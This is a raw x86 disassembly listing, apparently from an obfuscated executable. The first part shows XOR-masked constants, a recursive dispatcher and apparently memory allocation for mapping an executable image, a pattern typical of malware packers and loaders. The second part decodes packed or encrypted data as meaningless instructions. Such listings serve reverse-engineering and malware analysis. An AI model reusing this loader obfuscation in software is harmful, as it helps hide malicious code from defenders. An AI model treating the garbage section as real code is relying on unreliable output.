  41527b:	mov    ecx,DWORD PTR [ecx]
  41527d:	xor    ecx,edi
  41527f:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  415286:	or     al,cl
  415288:	mov    ecx,DWORD PTR [ebp-0x10]
  41528b:	mov    ecx,DWORD PTR [ecx]
  41528d:	xor    ecx,edi
  41528f:	mov    cl,BYTE PTR [ebp+ecx*1+0x327295]
  415296:	cmp    cl,al
  415298:	jne    0x41532e
  41529e:	mov    eax,DWORD PTR [ebp-0x14]
  4152a1:	mov    eax,DWORD PTR [eax]
  4152a3:	xor    eax,edi
  4152a5:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4152ac:	mov    ecx,DWORD PTR [ebp+0xc]
  4152af:	mov    ecx,DWORD PTR [ecx]
  4152b1:	xor    ecx,edi
  4152b3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  4152ba:	xor    al,cl
  4152bc:	mov    ecx,DWORD PTR [ebp-0xc]
  4152bf:	mov    ecx,DWORD PTR [ecx]
  4152c1:	xor    ecx,edi
  4152c3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  4152ca:	or     al,cl
  4152cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4152cf:	mov    ecx,DWORD PTR [ecx]
  4152d1:	xor    ecx,edi
  4152d3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327295]
  4152da:	cmp    cl,al
  4152dc:	jne    0x41532e
  4152de:	mov    eax,DWORD PTR [ebp-0x14]
  4152e1:	mov    eax,DWORD PTR [eax]
  4152e3:	xor    eax,edi
  4152e5:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4152ec:	mov    ecx,DWORD PTR [ebp-0xc]
  4152ef:	mov    ecx,DWORD PTR [ecx]
  4152f1:	xor    ecx,edi
  4152f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  4152fa:	xor    al,cl
  4152fc:	mov    ecx,DWORD PTR [ebp-0x10]
  4152ff:	mov    ecx,DWORD PTR [ecx]
  415301:	xor    ecx,edi
  415303:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  41530a:	or     al,cl
  41530c:	mov    ecx,DWORD PTR [ebp-0x14]
  41530f:	mov    ecx,DWORD PTR [ecx]
  415311:	xor    ecx,edi
  415313:	mov    cl,BYTE PTR [ebp+ecx*1+0x327295]
  41531a:	cmp    cl,al
  41531c:	jne    0x41532e
  41531e:	lea    eax,[ebp-0x4c]
  415321:	push   eax
  415322:	call   0x414de8
  415327:	mov    ecx,DWORD PTR [ebp-0x44]
  41532a:	cmp    eax,ecx
  41532c:	je     0x415338
  41532e:	mov    eax,DWORD PTR [ebp+0x8]
  415331:	xor    eax,edi
  415333:	add    eax,ebx
  415335:	mov    DWORD PTR [ebp+0x18],eax
  415338:	mov    eax,DWORD PTR [ebp-0x8]
  41533b:	xor    eax,edi
  41533d:	lea    eax,[eax+esi*1+0x3272dd]
  415344:	xor    eax,edi
  415346:	mov    ecx,DWORD PTR [ebp+0x8]
  415349:	mov    edx,DWORD PTR [ebp+0x18]
  41534c:	xor    ecx,edi
  41534e:	add    ecx,ebx
  415350:	cmp    edx,ecx
  415352:	je     0x41514f
  415358:	mov    eax,DWORD PTR [ebp+0x8]
  41535b:	mov    ecx,DWORD PTR [ebp+0x18]
  41535e:	xor    eax,edi
  415360:	add    eax,ebx
  415362:	cmp    ecx,eax
  415364:	jne    0x415377
  415366:	mov    eax,DWORD PTR [ebp-0x8]
  415369:	mov    ecx,DWORD PTR [ebp+0x1c]
  41536c:	xor    eax,edi
  41536e:	lea    eax,[eax+ecx*1+0x3272dd]
  415375:	jmp    0x4153ee
  415377:	push   0x18
  415379:	push   DWORD PTR [ebp-0x4]
  41537c:	lea    eax,[ebp-0x64]
  41537f:	push   eax
  415380:	call   0x414620
  415385:	mov    eax,DWORD PTR [ebp+0x8]
  415388:	mov    ecx,DWORD PTR [ebp-0x18]
  41538b:	xor    eax,edi
  41538d:	add    eax,ebx
  41538f:	cmp    eax,ecx
  415391:	je     0x4153a6
  415393:	mov    eax,DWORD PTR [ebp+0x8]
  415396:	xor    eax,edi
  415398:	add    eax,ebx
  41539a:	push   eax
  41539b:	push   0x18
  41539d:	lea    eax,[ebp-0x64]
  4153a0:	push   eax
  4153a1:	call   0x414b97
  4153a6:	mov    eax,DWORD PTR [ebp-0x4]
  4153a9:	add    eax,0x18
  4153ac:	mov    DWORD PTR [ebp+0x18],eax
  4153af:	push   DWORD PTR [ebp-0x50]
  4153b2:	push   DWORD PTR [ebp+0x18]
  4153b5:	mov    eax,DWORD PTR [ebp-0x54]
  4153b8:	add    eax,DWORD PTR [ebp-0x20]
  4153bb:	push   eax
  4153bc:	call   0x414620
  4153c1:	mov    eax,DWORD PTR [ebp+0x8]
  4153c4:	mov    ecx,DWORD PTR [ebp-0x18]
  4153c7:	xor    eax,edi
  4153c9:	add    eax,ebx
  4153cb:	cmp    eax,ecx
  4153cd:	je     0x4153e0
  4153cf:	push   0x0
  4153d1:	push   DWORD PTR [ebp-0x50]
  4153d4:	mov    eax,DWORD PTR [ebp-0x54]
  4153d7:	add    eax,DWORD PTR [ebp-0x20]
  4153da:	push   eax
  4153db:	call   0x414b97
  4153e0:	mov    eax,DWORD PTR [ebp-0x24]
  4153e3:	mov    ecx,DWORD PTR [ebp-0x50]
  4153e6:	add    DWORD PTR [eax],ecx
  4153e8:	mov    eax,DWORD PTR [ebp-0x50]
  4153eb:	add    eax,DWORD PTR [ebp+0x1c]
  4153ee:	mov    DWORD PTR [ebp+0x1c],eax
  4153f1:	mov    eax,DWORD PTR [ebp-0x8]
  4153f4:	mov    ecx,DWORD PTR [ebp+0x1c]
  4153f7:	xor    eax,edi
  4153f9:	add    eax,ebx
  4153fb:	imul   eax,ecx
  4153fe:	mov    ecx,DWORD PTR [ebp+0x8]
  415401:	mov    edx,DWORD PTR [ebp-0x28]
  415404:	xor    ecx,edi
  415406:	lea    ecx,[ecx+edx*1+0x3272dd]
  41540d:	cmp    eax,ecx
  41540f:	jb     0x41506c
  415415:	mov    esi,DWORD PTR [ebp+0x14]
  415418:	mov    eax,DWORD PTR [ebp-0x20]
  41541b:	mov    DWORD PTR [esi],eax
  41541d:	jmp    0x415464
  41541f:	mov    ecx,DWORD PTR [ebp+0x8]
  415422:	mov    edx,DWORD PTR [ebp+0xc]
  415425:	xor    ecx,edi
  415427:	xor    edx,edi
  415429:	add    ecx,ebx
  41542b:	add    edx,ebx
  41542d:	cmp    ecx,edx
  41542f:	jne    0x415443
  415431:	mov    eax,ds:0x7f642d1c
  415436:	imul   eax,eax,0x9f15fcef
  41543c:	mov    ds:0x7f642d1c,eax
  415441:	jmp    0x415464
  415443:	mov    ecx,DWORD PTR [ebp+0x8]
  415446:	xor    ecx,edi
  415448:	add    ecx,ebx
  41544a:	cmp    eax,ecx
  41544c:	je     0x41545a
  41544e:	sub    DWORD PTR ds:0xf861e3c,0x709beac4
  415458:	jmp    0x415464
  41545a:	and    DWORD PTR ds:0x3343fa1c,0x5265ec3f
  415464:	pop    edi
  415465:	pop    esi
  415466:	pop    ebx
  415467:	leave  
  415468:	ret    0x18
  41546b:	push   ebp
  41546c:	mov    ebp,esp
  41546e:	and    esp,0xfffffff8
  415471:	mov    eax,DWORD PTR [ebp+0x20]
  415474:	sub    esp,0x14
  415477:	push   ebx
  415478:	mov    ebx,DWORD PTR [ebp+0x14]
  41547b:	push   esi
  41547c:	push   edi
  41547d:	cmp    eax,0xf89c85b5
  415482:	jne    0x41548e
  415484:	push   0xf89c85b2
  415489:	jmp    0x4155c0
  41548e:	mov    eax,DWORD PTR [ebp+0x20]
  415491:	cmp    eax,0xf89c85b2
  415496:	jne    0x4154a2
  415498:	push   0xf89c85b3
  41549d:	jmp    0x4155c0
  4154a2:	mov    eax,DWORD PTR [ebp+0x20]
  4154a5:	cmp    eax,0xf89c85b3
  4154aa:	jne    0x4154b6
  4154ac:	push   0xf89c85b0
  4154b1:	jmp    0x4155c0
  4154b6:	mov    eax,DWORD PTR [ebp+0x20]
  4154b9:	cmp    eax,0xf89c85b0
  4154be:	jne    0x4154ca
  4154c0:	push   0xf89c85b1
  4154c5:	jmp    0x4155c0
  4154ca:	mov    ecx,DWORD PTR [ebp+0x20]
  4154cd:	mov    eax,0xf89c85bc
  4154d2:	cmp    ecx,eax
  4154d4:	jne    0x415590
  4154da:	mov    eax,DWORD PTR [ebp+0x10]
  4154dd:	mov    DWORD PTR [esp+0xc],eax
  4154e1:	mov    eax,DWORD PTR [ebp+0x18]
  4154e4:	mov    DWORD PTR [esp+0x14],eax
  4154e8:	mov    eax,DWORD PTR [ebp+0xc]
  4154eb:	mov    DWORD PTR [esp+0x18],eax
  4154ef:	mov    eax,DWORD PTR [ebp+0x8]
  4154f2:	mov    DWORD PTR [esp+0x10],eax
  4154f6:	mov    eax,DWORD PTR [esp+0x10]
  4154fa:	mov    ecx,DWORD PTR [esp+0x14]
  4154fe:	mov    edi,0x7510896
  415503:	xor    eax,edi
  415505:	mov    esi,0x3272dd
  41550a:	add    eax,esi
  41550c:	mov    DWORD PTR [ecx],eax
  41550e:	mov    eax,DWORD PTR [esp+0xc]
  415512:	mov    eax,DWORD PTR [eax+0x194]
  415518:	mov    ecx,DWORD PTR [eax]
  41551a:	mov    eax,DWORD PTR [esp+0xc]
  41551e:	mov    eax,DWORD PTR [eax+0x194]
  415524:	mov    eax,DWORD PTR [eax]
  415526:	add    eax,DWORD PTR [ecx+0x3c]
  415529:	mov    ecx,DWORD PTR [esp+0xc]
  41552d:	mov    ecx,DWORD PTR [ecx+0x1d8]
  415533:	mov    ecx,DWORD PTR [ecx+0x14]
  415536:	push   0x4
  415538:	push   0x3000
  41553d:	push   DWORD PTR [eax+0x50]
  415540:	push   0x0
  415542:	call   ecx
  415544:	mov    DWORD PTR [ebx],eax
  415546:	mov    eax,DWORD PTR [esp+0x10]
  41554a:	push   DWORD PTR [esp+0xc]
  41554e:	xor    eax,edi
  415550:	add    eax,esi
  415552:	mov    DWORD PTR [esp+0x20],eax
  415556:	lea    eax,[esp+0x20]
  41555a:	push   eax
  41555b:	push   ebx
  41555c:	push   DWORD PTR [esp+0x20]
  415560:	push   DWORD PTR [esp+0x28]
  415564:	push   DWORD PTR [esp+0x24]
  415568:	call   0x414f2c
  41556d:	mov    eax,DWORD PTR [esp+0x10]
  415571:	mov    ecx,DWORD PTR [ebx]
  415573:	xor    eax,edi
  415575:	add    eax,esi
  415577:	cmp    ecx,eax
  415579:	je     0x4155d7
  41557b:	mov    eax,DWORD PTR [esp+0x18]
  41557f:	mov    ecx,DWORD PTR [esp+0x14]
  415583:	xor    eax,edi
  415585:	add    eax,esi
  415587:	imul   eax,DWORD PTR [esp+0x1c]
  41558c:	mov    DWORD PTR [ecx],eax
  41558e:	jmp    0x4155d7
  415590:	mov    ecx,DWORD PTR [ebp+0x20]
  415593:	cmp    ecx,0xf89c85b1
  415599:	jne    0x4155a2
  41559b:	push   0xf89c85be
  4155a0:	jmp    0x4155c0
  4155a2:	mov    ecx,DWORD PTR [ebp+0x20]
  4155a5:	cmp    ecx,0xf89c85be
  4155ab:	jne    0x4155b4
  4155ad:	push   0xf89c85bf
  4155b2:	jmp    0x4155c0
  4155b4:	mov    ecx,DWORD PTR [ebp+0x20]
  4155b7:	cmp    ecx,0xf89c85bf
  4155bd:	jne    0x4155d7
  4155bf:	push   eax
  4155c0:	push   DWORD PTR [ebp+0x1c]
  4155c3:	push   DWORD PTR [ebp+0x18]
  4155c6:	push   ebx
  4155c7:	push   DWORD PTR [ebp+0x10]
  4155ca:	push   DWORD PTR [ebp+0xc]
  4155cd:	push   DWORD PTR [ebp+0x8]
  4155d0:	call   0x41546b
  4155d5:	mov    DWORD PTR [ebx],eax
  4155d7:	mov    eax,DWORD PTR [ebx]
  4155d9:	pop    edi
  4155da:	pop    esi
  4155db:	pop    ebx
  4155dc:	mov    esp,ebp
  4155de:	pop    ebp
  4155df:	ret    0x1c
  4155e2:	push   ebp
  4155e3:	mov    ebp,esp
  4155e5:	sub    esp,0xc
  4155e8:	mov    eax,0xf89c85b5
  4155ed:	mov    DWORD PTR [ebp-0x8],eax
  4155f0:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  4155f7:	mov    ecx,DWORD PTR [ebp-0x8]
  4155fa:	xor    ecx,0x7510896
  415600:	add    ecx,0x3272dd
  415606:	mov    DWORD PTR [ebp-0x4],ecx
  415609:	mov    ecx,DWORD PTR [ebp+0xc]
  41560c:	push   eax
  41560d:	mov    DWORD PTR [ebp+0xc],ecx
  415610:	push   DWORD PTR [ebp+0xc]
  415613:	lea    eax,[ebp-0x4]
  415616:	push   DWORD PTR [ebp+0x8]
  415619:	push   eax
  41561a:	push   DWORD PTR [ebp+0xc]
  41561d:	push   DWORD PTR [ebp-0xc]
  415620:	push   DWORD PTR [ebp-0x8]
  415623:	call   0x41546b
  415628:	mov    DWORD PTR [ebp-0x4],eax
  41562b:	mov    eax,DWORD PTR [ebp-0x4]
  41562e:	leave  
  41562f:	ret    0x8
  415632:	mov    cl,0x27
  415634:	popa   
  415635:	test   bh,dh
  415637:	(bad)  
  415638:	cmc    
  415639:	aaa    
  41563a:	push   ss
  41563b:	shr    BYTE PTR [edi],0x1f
  41563e:	xchg   esi,eax
  41563f:	ds push ss
  415641:	mov    esi,0xd479
  415646:	hlt    
  415647:	add    al,0x0
  415649:	add    dh,dh
  41564b:	mov    WORD PTR [ecx+0x4f53b96e],?
  415651:	gs jmp 0x415617
  415654:	add    esp,DWORD PTR [eax+0x79]
  415657:	xor    al,0x50
  415659:	jae    0x415669
  41565b:	inc    esi
  41565c:	test   al,0x9f
  41565e:	sub    BYTE PTR [eax],ah
  415660:	cdq    
  415661:	add    BYTE PTR ds:0x76583157,bl
  415667:	mov    BYTE PTR [esi],dl
  415669:	pop    ds
  41566a:	and    edx,DWORD PTR [ebp-0x5677e903]
  415670:	push   ebp
  415671:	leave  
  415672:	or     BYTE PTR [esi+0x1985cc80],0xae
  415679:	sbb    DWORD PTR [eax],ecx
  41567b:	sub    esp,0xffffff88
  41567e:	ins    BYTE PTR es:[edi],dx
  41567f:	mov    ebx,?
  415681:	push   ds
  415682:	jge    0x41567f
  415684:	(bad)  
  415685:	and    dh,BYTE PTR [ecx]
  415687:	lock pop ebx
  415689:	adc    eax,0x1ace6d0b
  41568e:	mov    edi,0x77491890
  415693:	loope  0x4156cd
  415695:	fwait
  415696:	scas   al,BYTE PTR es:[edi]
  415697:	lods   eax,DWORD PTR ds:[esi]
  415698:	ja     0x41562f
  41569a:	daa    
  41569b:	sbb    al,0x62
  41569d:	and    edx,ebx
  41569f:	xchg   BYTE PTR [edi-0x57],ch
  4156a2:	jae    0x415709
  4156a4:	xchg   esp,eax
  4156a5:	inc    esp
  4156a6:	fwait
  4156a7:	mov    esp,0x4d540986
  4156ac:	cmp    al,BYTE PTR [edi+0x52e31eeb]
  4156b2:	dec    ebp
  4156b3:	cmp    BYTE PTR ds:0xb42b7357,dl
  4156b9:	push   esi
  4156ba:	mov    edx,0x7eae7788
  4156bf:	imul   ecx,DWORD PTR [ebx+0x51],0xffffffab
  4156c3:	call   0x8bc5:0x1b66538e
  4156ca:	or     eax,0xf7274ee5
  4156cf:	daa    
  4156d0:	pusha  
  4156d1:	fmul   QWORD PTR [ecx+0x4]
  4156d4:	out    0x9f,al
  4156d6:	and    eax,0xf1c06b4f
  4156db:	and    BYTE PTR [eax],bl
  4156dd:	fst    DWORD PTR [ebx]
  4156df:	xchg   edi,eax
  4156e0:	imul   esp,ecx,0xffffff83
  4156e3:	mov    eax,ds:0x7f371657
  4156e8:	pop    ebx
  4156e9:	xchg   edi,eax
  4156ea:	push   esi
  4156ec:	jno    0x4156b8
  4156ee:	push   edi
  4156ef:	inc    ebp
  4156f0:	ss pusha 
  4156f2:	dec    BYTE PTR [eax-0x75]
  4156f5:	fild   DWORD PTR [edi+edi*8]
  4156f8:	dec    eax
  4156f9:	(bad)  
  4156fa:	retf   
  4156fb:	xchg   ebx,eax
  4156fc:	xchg   ecx,eax
  4156fd:	scas   eax,DWORD PTR es:[edi]
  4156fe:	push   0x4
  415700:	imul   ebx,edi,0xf0ec1fe4
  415706:	scas   al,BYTE PTR es:[edi]
  415707:	mov    al,ds:0x4de4d0d
  41570c:	dec    edx
  41570d:	loopne 0x4156c0
  41570f:	enter  0xc93,0x0
  415713:	xchg   edx,eax
  415714:	test   eax,0xaae7b6ae
  415719:	aas    
  41571a:	in     eax,0x1d
  41571c:	nop
  41571d:	ja     0x415709
  41571f:	enter  0xafb0,0xe9
  415723:	pop    ds
  415724:	inc    eax
  415725:	sbb    esi,DWORD PTR [ebp+0x5c]
  415728:	inc    ebx
  415729:	sti    
  41572a:	xor    BYTE PTR [esp+edi*2],dl
  41572d:	mov    eax,ds:0x2d88d6b
  415732:	mov    esp,0x9d03400f
  415737:	push   es
  415738:	arpl   cx,di
  41573a:	and    esp,DWORD PTR [ecx-0x704a7dd0]
  415740:	retf   
  415741:	retf   0xc000
  415744:	fistp  QWORD PTR [esi]
  415746:	cld    
  415747:	jle    0x415713
  415749:	push   ecx
  41574a:	xchg   ecx,eax
  41574b:	pop    edi
  41574c:	cwde   
  41574d:	sbb    al,0x97
  41574f:	cmc    
  415750:	mov    ch,0x9a
  415752:	mov    dl,0x8c
  415754:	mov    ah,0x1
  415756:	cmp    al,0xc5
  415758:	mov    cl,0xa2
  41575a:	out    0x54,al
  41575c:	push   esp
  41575d:	std    
  41575e:	daa    
  41575f:	ret    
  415760:	int    0x19
  415762:	push   0xea079cce
  415767:	imul   DWORD PTR ds:0xb178c0f3
  41576d:	mov    WORD PTR [eax+0x45d4ebcb],ds
  415773:	add    al,0x8b
  415775:	stc    
  415776:	jecxz  0x415782
  415778:	dec    ecx
  415779:	inc    ebx
  41577a:	and    DWORD PTR [edx+ecx*1],0xa954319b
  415781:	pop    eax
  415782:	cdq    
  415783:	mov    dh,0xec
  415785:	xchg   BYTE PTR ds:0xa37e43f9,bh
  41578b:	inc    esi
  41578c:	mov    ds:0x36681207,eax
  415791:	push   ds
  415792:	scas   eax,DWORD PTR es:[edi]
  415793:	aad    0x32
  415795:	ror    ch,cl
  415797:	in     eax,dx
  415798:	adc    al,0x4a
  41579a:	repz in eax,0xbd
  41579d:	stc    
  41579e:	ror    BYTE PTR ds:0xfbd4bf88,1
  4157a4:	ret    0x926a
  4157a7:	pop    ds
  4157a8:	inc    ebp
  4157a9:	push   ss
  4157aa:	cmc    
  4157ab:	mov    edx,0x206b20d7
  4157b0:	sub    ebx,ecx
  4157b2:	shr    BYTE PTR [eax-0x41d97c68],1
  4157b8:	adc    BYTE PTR [edx],0x9e
  4157bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157bc:	mov    ah,0x6c
  4157be:	scas   al,BYTE PTR es:[edi]
  4157bf:	shl    DWORD PTR [ebp+0x32],cl
  4157c2:	jp     0x41580b
  4157c4:	adc    eax,0xc477290d
  4157c9:	(bad)  
  4157cb:	js     0x415765
  4157cd:	outs   dx,BYTE PTR ds:[esi]
  4157ce:	jnp    0x4157a9
  4157d0:	daa    
  4157d1:	sub    DWORD PTR [ebx-0x12],edi
  4157d4:	shl    DWORD PTR [ecx-0x29],0x88
  4157d8:	mov    bh,0x53
  4157da:	mov    ebx,0x730fd905
  4157df:	ja     0x4157c8
  4157e1:	popf   
  4157e2:	xchg   esp,eax
  4157e3:	(bad)  
  4157e5:	and    eax,0xb18d49d7
  4157ea:	sbb    al,0x37
  4157ec:	jge    0x4157e2
  4157ee:	push   cs
  4157ef:	inc    edi
  4157f0:	retf   
  4157f1:	into   
  4157f2:	push   ebx
  4157f3:	mov    DWORD PTR [ebx+0x51],edi
  4157f6:	mov    eax,ds:0xbd895aa1
  4157fb:	mov    al,0x9c
  4157fd:	mov    ds:0x489cabef,al
  415802:	mov    bh,0xf6
  415804:	inc    edx
  415805:	xchg   ecx,eax
  415806:	out    0xca,eax
  415808:	lahf   
  415809:	fdiv   st(2),st
  41580b:	fnstsw WORD PTR [edx]
  41580d:	jmp    0xa366:0x4809e38d
  415814:	fdiv   QWORD PTR [esi-0x6a]
  415817:	cmp    DWORD PTR [edi],edi
  415819:	stc    
  41581a:	pop    esi
  41581b:	lds    ebx,FWORD PTR [ebx-0x4c2b1e21]
  415821:	push   0x3c
  415823:	in     al,0x3d
  415825:	(bad)  
  415826:	mov    eax,0x1878c529
  41582b:	cmp    dl,0x8d
  41582e:	stos   BYTE PTR es:[edi],al
  41582f:	cmp    cl,0xa5
  415832:	in     al,dx
  415833:	mov    eax,ds:0x4161c10f
  415838:	adc    edi,DWORD PTR [esi+0x5d]
  41583b:	ja     0x4157f6
  41583d:	(bad)  
  41583e:	push   ds
  41583f:	xor    eax,0x7a87ce7d
  415844:	fbld   TBYTE PTR [ebp+0x59]
  415847:	push   ecx
  415848:	adc    al,0x7b
  41584a:	mov    DWORD PTR [ebp-0x79],esp
  41584d:	cmp    edi,DWORD PTR [ecx+0x7aaf37bb]
  415853:	push   0xe
  415855:	adc    eax,0x988717f4
  41585a:	test   eax,0x231a8714
  41585f:	and    eax,0xd606132a
  415864:	lea    ebp,[edx+0x255768ee]
  41586a:	fcomp  QWORD PTR [eax+0x0]
  41586d:	mov    cl,0x35
  41586f:	shl    DWORD PTR [ebp+0x53f0163d],cl
  415875:	jg     0x415837
  415877:	xor    BYTE PTR [ebx+ecx*4],dh
  41587a:	fild   DWORD PTR [ebx]
  41587c:	fstp   TBYTE PTR [ecx]
  41587e:	popa   
  41587f:	jns    0x41581d
  415881:	jecxz  0x4158b0
  415883:	sbb    eax,esp
  415885:	ret    
  415886:	inc    edi
  415887:	arpl   WORD PTR ss:[esi-0x211f83bc],sp
  41588e:	dec    ebp
  41588f:	addr16 mov bh,0x8d
  415892:	adc    eax,0x7f335912
  415897:	pop    ss
  415898:	pop    ebp
  415899:	and    BYTE PTR [eax-0x6d],dh
  41589c:	sub    ecx,ebx
  41589e:	sub    DWORD PTR [edi+0x1ec7d85e],ecx
  4158a4:	push   edx
  4158a5:	int3   
  4158a6:	xchg   edx,eax
  4158a7:	rcr    dh,cl
  4158a9:	mov    bh,0x66
  4158ab:	int    0xb0
  4158ad:	inc    ecx
  4158ae:	add    bl,ah
  4158b0:	jae    0x41584c
  4158b2:	das    
  4158b3:	xor    al,0xe4
  4158b5:	pop    es
  4158b6:	or     cl,0xa6
  4158b9:	fs jae 0x415874
  4158bc:	cs stc 
  4158be:	out    0xd9,al
  4158c0:	int3   
  4158c1:	out    0x47,al
  4158c3:	mov    ah,0x49
  4158c5:	lods   eax,DWORD PTR ds:[esi]
  4158c6:	mov    BYTE PTR [bx],dl
  4158c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158ca:	aad    0xec
  4158cc:	fld    DWORD PTR [edi+edi*4]
  4158cf:	push   edi
  4158d0:	add    edi,eax
  4158d2:	repz pop ecx
  4158d4:	sbb    al,0x34
  4158d6:	push   eax
  4158d7:	sti    
  4158d8:	gs (bad) 
  4158da:	out    0x93,al
  4158dc:	les    esi,FWORD PTR [eax-0x59]
  4158df:	lods   al,BYTE PTR ds:[esi]
  4158e0:	mov    ds:0xfa783cdf,al
  4158e5:	shl    bl,1
  4158e7:	push   ebp
  4158e8:	ret    0x68c6
  4158eb:	enter  0x5dd1,0x3a
  4158ef:	adc    al,BYTE PTR [eax+0x6d]
  4158f2:	cmc    
  4158f3:	popa   
  4158f4:	lahf   
  4158f5:	mov    ebp,0x88d6821d
  4158fa:	lock (bad) 
  4158fd:	sub    ecx,DWORD PTR [eax-0x1a34925c]
  415903:	xor    cl,BYTE PTR [ebx]
  415905:	xchg   edi,eax
  415906:	sbb    BYTE PTR [esi-0x3acc6209],dh
  41590c:	jbe    0x4158b1
  41590e:	or     dh,dl
  415910:	div    BYTE PTR [esi-0x74]
  415913:	in     eax,0x33
  415915:	inc    edi
  415916:	cmp    al,0x75
  415918:	retf   
  415919:	shl    BYTE PTR [eax-0x7c39139f],0x28
  415920:	hlt    
  415921:	cdq    
  415922:	jmp    0xcfce751f
  415927:	ds in  eax,dx
  415929:	test   al,0x37
  41592b:	in     al,dx
  41592c:	pop    esp
  41592d:	pop    es
  41592e:	fwait
  41592f:	cs gs sub edi,ebx
  415933:	push   ss
  415934:	xor    DWORD PTR [edx-0x368c725e],eax
  41593a:	inc    ebx
  41593b:	inc    ebp
  41593c:	das    
  41593d:	or     DWORD PTR [edi],esp
  41593f:	mov    edx,0xe4736a3a
  415944:	ret    
  415945:	lahf   
  415946:	dec    edx
  415947:	cs ss out dx,al
  41594a:	lods   eax,DWORD PTR ds:[esi]
  41594b:	dec    edx
  41594c:	add    bl,BYTE PTR [ecx+0xf077507]
  415952:	and    DWORD PTR [edx-0x156a6390],0xffffff89
  415959:	inc    esi
  41595a:	push   cs
  41595b:	pop    esi
  41595c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41595d:	xchg   ebp,eax
  41595e:	xchg   esp,eax
  41595f:	pop    sp
  415961:	repz mov bl,0x25
  415964:	or     eax,0x435e7026
  415969:	outs   dx,DWORD PTR ds:[esi]
  41596a:	mov    bh,0xf9
  41596c:	jae    0x4158f0
  41596e:	cld    
  41596f:	ins    BYTE PTR es:[edi],dx
  415970:	shr    DWORD PTR [eax+0x4bd29611],cl
  415976:	cli    
  415977:	cmp    al,0xcf
  41597a:	dec    eax
  41597b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41597c:	pusha  
  41597d:	(bad)  
  41597e:	fcomp  DWORD PTR [edx+0x25]
  415981:	dec    ecx
  415982:	stos   BYTE PTR es:[edi],al
  415983:	push   esp
  415984:	jbe    0x4159b7
  415986:	push   eax
  415987:	das    
  415988:	pop    ebp
  415989:	jb     0x4159b9
  41598b:	xchg   ebx,eax
  41598c:	in     al,dx
  41598d:	add    BYTE PTR [ecx],ah
  41598f:	mov    ch,0x2d
  415991:	gs int 0x32
  415994:	rcl    BYTE PTR [ecx+esi*2],1
  415997:	aas    
  415998:	push   ecx
  415999:	ins    BYTE PTR es:[edi],dx
  41599a:	cmp    ebx,eax
  41599c:	and    DWORD PTR [eax+ebx*8-0x1ec2a228],ebx
  4159a3:	jne    0x41592b
  4159a5:	cld    
  4159a6:	in     al,dx
  4159a7:	mov    ebx,0xacb44a10
  4159ac:	cdq    
  4159ad:	js     0x415990
  4159af:	or     ebp,0x7c562a5e
  4159b5:	stos   BYTE PTR es:[edi],al
  4159b6:	lea    edx,[ebx-0x6046773c]
  4159bc:	test   BYTE PTR [eax+0x43a81401],ah
  4159c2:	push   es
  4159c3:	push   0x15c04155
  4159c8:	fisubr WORD PTR [ebx+ecx*2]
  4159cb:	push   esi
  4159cc:	adc    ebp,DWORD PTR [eax+0x1b35e1cc]
  4159d2:	inc    ebx
  4159d3:	jp     0x4159b0
  4159d5:	nop
  4159d6:	cmp    eax,0x8e5879ca
  4159db:	dec    ebx
  4159dc:	rol    dh,1
  4159de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159df:	leave  
  4159e0:	xchg   esi,ecx
  4159e2:	or     dl,BYTE PTR [edx]
  4159e4:	clc    
  4159e5:	jmp    0x8def4aff
  4159ea:	sub    bl,BYTE PTR [ebp+0x4c0ba4cb]
  4159f0:	or     DWORD PTR [esp+eiz*2+0x14],0x7d7dcb4c
  4159f8:	mov    dh,0xf6
  4159fa:	(bad)  
  4159fb:	push   DWORD PTR [ecx]
  4159fd:	jno    0x41598d
  4159ff:	and    ch,BYTE PTR [ecx+0x46]
  415a02:	mov    DWORD PTR [esi],ecx
  415a04:	icebp  
  415a05:	mov    DWORD PTR [edx],esi
  415a07:	stos   BYTE PTR es:[edi],al
  415a08:	mov    cl,0xc3
  415a0a:	sbb    al,0x6e
  415a0c:	int3   
  415a0d:	adc    DWORD PTR [edi+ecx*8-0x5fdb63d2],0xcb594228
  415a18:	add    eax,0xa6cf9472
  415a1d:	push   edx
  415a1e:	sahf   
  415a1f:	or     al,0xfb
  415a21:	stos   DWORD PTR es:[edi],eax
  415a22:	(bad)  
  415a23:	call   0x6869:0x56eec465
  415a2a:	fwait
  415a2b:	mov    cl,0xb9
  415a2d:	std    
  415a2e:	jmp    0x6a9754d5
  415a33:	dec    ecx
  415a34:	pslld  mm5,QWORD PTR [ebx+0x7ba1d1e]
  415a3b:	pop    ds
  415a3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a3d:	stc    
  415a3e:	ficom  DWORD PTR [esi]
  415a40:	test   esp,0xcb866418
  415a46:	nop
  415a47:	adc    edi,DWORD PTR [esi+0x3d1604a8]
  415a4d:	jb     0x415a65
  415a4f:	xchg   DWORD PTR [esi],esp
  415a51:	fist   DWORD PTR [ebp+0x4eb04cec]
  415a57:	adc    ebx,DWORD PTR [ebp-0x24ebe39f]
  415a5d:	xchg   esp,edi
  415a5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a60:	pop    eax
  415a61:	lock add eax,DWORD PTR [ebx-0x76]
  415a65:	push   ss
  415a66:	cld    
  415a67:	sbb    al,0x3e
  415a69:	xor    al,0xaa
  415a6b:	stos   BYTE PTR es:[di],al
  415a6d:	mov    al,0xe6
  415a6f:	in     eax,dx
  415a70:	jne    0x415a3a
  415a72:	repz test BYTE PTR [eax-0x44],bh
  415a76:	stos   DWORD PTR es:[edi],eax
  415a77:	hlt    
  415a78:	push   ds
  415a79:	and    eax,0xa5859a2c
  415a7e:	das    
  415a7f:	pop    esi
  415a80:	jmp    0x29b4:0xd4c70c7f
  415a87:	in     al,0xc6
  415a89:	js     0x415a57
  415a8b:	int    0xc5
  415a8d:	push   esi
